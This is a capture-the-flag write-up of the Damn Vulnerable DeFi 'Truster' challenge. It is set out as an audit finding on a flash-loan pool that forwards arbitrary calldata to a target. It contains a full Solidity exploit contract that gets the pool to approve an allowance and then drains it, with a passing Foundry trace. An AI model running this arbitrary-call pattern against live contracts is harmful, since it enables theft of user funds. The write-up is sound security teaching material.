# Damn Vulnerable Defi - Truster
- Scope
    - TrusterLenderPool.sol
    - DamnValuableToken.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## Inproper implementation of `flashLoan()` that allows calling arbitrary functions

### Summary
The `flashLoan()` function in `TrusterLenderPool.sol` allows calling arbitrary functions which does not follow the standard approach. This can be exploited to drain the tokens inside the pool.

### Vulnerability Details
The `target.functionCall()` is an improper practice and allows calling arbitrary functions.
```diff
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
+        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
```
### Impact/Proof of Concept
1. flashLoan() give the user the freedom to call any function they want in "target.functionCall(data)"
2. To abuse it, we need call flashLoan() and provide our malicious calldata. There are a few things we need to fulfill:  
    (a) We need to ensure the pool's balance is the same as before so the tx will not revert  
    (b) We can perform transferFrom() pool to recovery. But we require approve() allowance from pool first
3. Hence, our calldata need to include approve()
4. Lastly, player must complete this in one tx, hence we create the malicious codes in another contract and use player to call it (count as one tx).
```
function test_truster() public checkSolvedByPlayer {
        TrusterExploit exploit = new TrusterExploit(address(token), address(pool), recovery, player);
        exploit.attack();
    }
    
contract TrusterExploit {
    DamnValuableToken public token;
    TrusterLenderPool public pool;
    address public recovery;
    address public player;

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;


    constructor(address tokenAddress, address poolAddress, address recoveryAddress, address playerAddress){
        token = DamnValuableToken(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
        recovery = recoveryAddress;
        player = playerAddress;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                TOKENS_IN_POOL
            );

        pool.flashLoan(0, address(player), address(token), data);
        // Manual transferFrom()
        token.transferFrom(address(pool), address(recovery), TOKENS_IN_POOL);
        console.log("pool Balance", token.balanceOf(address(pool)));
        console.log("recovery Balance", token.balanceOf(address(recovery)));
    }

}
```

Results
```diff
[PASS] test_truster() (gas: 426138)
Logs:
  pool Balance: 0
  recovery Balance: 1000000000000000000000000

Traces:
  [453638] TrusterChallenge::test_truster()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return] 
    ├─ [321179] → new TrusterExploit@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 1159 bytes of code
    ├─ [82529] TrusterExploit::attack()
    │   ├─ [43132] TrusterLenderPool::flashLoan(0, player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 0x095ea7b3000000000000000000000000ce110ab5927cc46905460d930cca0c6fb466621900000000000000000000000000000000000000000000d3c21bcecceda1000000)
    │   │   ├─ [2519] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   ├─ [4974] DamnValuableToken::transfer(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], 0)
    │   │   │   ├─ emit Transfer(from: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], to: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], amount: 0)
    │   │   │   └─ ← [Return] true
    │   │   ├─ [24523] DamnValuableToken::approve(TrusterExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], spender: TrusterExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000000 [1e24])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [519] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   └─ ← [Return] true
    │   ├─ [28428] DamnValuableToken::transferFrom(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1000000000000000000000000 [1e24])
    │   │   ├─ emit Transfer(from: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1000000000000000000000000 [1e24])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [519] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [0] console::log("pool Balance", 0) [staticcall]
    │   │   └─ ← [Stop] 
    │   ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   ├─ [0] console::log("recovery Balance", 1000000000000000000000000 [1e24]) [staticcall]
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

```
